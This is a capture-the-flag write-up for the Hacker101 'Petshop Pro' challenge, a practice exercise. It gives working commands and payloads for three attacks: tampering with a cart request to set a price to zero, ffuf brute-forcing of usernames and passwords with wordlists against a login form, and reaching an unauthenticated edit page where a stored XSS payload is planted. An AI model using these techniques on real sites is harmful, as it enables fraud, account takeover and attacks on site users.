# Hacker101 CTF: Petshop pro

Let's try new format, without excess water.
The challenge provides a simple petshop page which includes two images and buttons for adding to the busket.
<img width="783" height="453" alt="image" src="https://github.com/user-attachments/assets/5ccbeae9-a5b1-4c00-bd71-ad583948499a" />

## Flag №1: Price Manipulation

Try to make an order then click `F12` in the browser and examine the network requests and payloads. Our order is sent in the payload as JSON data that we can modify and resend. If you can work with Burp Suite, it may be an easier way.
Let's do it and change the price, for example:

```javascript
Before
"cart=%5B%5B1%2C+%7B%22name%22%3A+%22Puppy%22%2C+%22desc%22%3A+%228%5C%22x10%5C%22+color+glossy+photograph+of+a+puppy.%22%2C+%22logo%22%3A+%22puppy.jpg%22%2C+%22price%22%3A+7.95%7D%5D%5D"

After
"cart=%5B%5B1%2C+%7B%22name%22%3A+%22Puppy%22%2C+%22desc%22%3A+%228%5C%22x10%5C%22+color+glossy+photograph+of+a+puppy.%22%2C+%22logo%22%3A+%22puppy.jpg%22%2C+%22price%22%3A+0%7D%5D%5D"
```

Click on the checkout request, then Copy as fetch and paste it into the browser's developer console. Send it! Go to the response and get the **FIRST FLAG**!

### Flag №2: Authentication Bypass
Try looking for hidden paths:

```bash
dirb https://f126046110021f5ea353b51256233654.ctf.hacker101.com/checkout
```

You may also use Gobuster or FFUF - it doesn't matter what you prefer. However, we find two interesting extra paths: `\edit` with code 400 and `\login` with code 200.
Go to the authorization page `/login`. Try simple combinations - you get nothing except an `Invalid username` message on the page, which we will use later.

In my case I used FFUF:

```bash
ffuf -u https://f126046110021f5ea353b51256233654.ctf.hacker101.com/login \
     -w /usr/share/wordlists/seclists/Usernames/Names/names.txt \
     -X POST \
     -d "username=FUZZ&password=test" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -mr "Invalid password"
```

Where FUZZ indicates the place for brute-forcing.
After getting the username, do the same with the password:

```bash
ffuf -u https://f126046110021f5ea353b51256233654.ctf.hacker101.com/login \
     -w /usr/share/wordlists/rockyou.txt \
     -X POST \
     -d "username=found_name&password=FUZZ" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -fr "Invalid password"
```
After several tries, we have login and password. Paste them into the form and get the **SECOND FLAG**.

### Flag №3: IDOR + XSS
There are two ways:
1. Without prior admin authorization
2. With admin credentials from Flag 2

Let's try the first way, as if we didn't get the authorization data.

Earlier we found the extra path `/edit` with code 400. The 400 code is interesting because it indicates we might get access if we provide the correct parameters. When we worked on the first flag in the payloads, we noticed that the images use ids: 0 for the first and 1 for the second. Let's try to add an id parameter and access the edit page:

```javascript
https://f126046110021f5ea353b51256233654.ctf.hacker101.com/edit?id=1
```

We got access to the edit page without authorization! Test input fields for XSS and save changes.

```javascript
<img src=x onerror=alert()>
```
Paste it into the description field.
Return to the main page, add an item to the cart, and see our alert() message with the **THIRD FLAG**.

:rocket:**CONGRATULATIONS! YOU ARE THE BEST! STAY WITH ME!**:rocket:

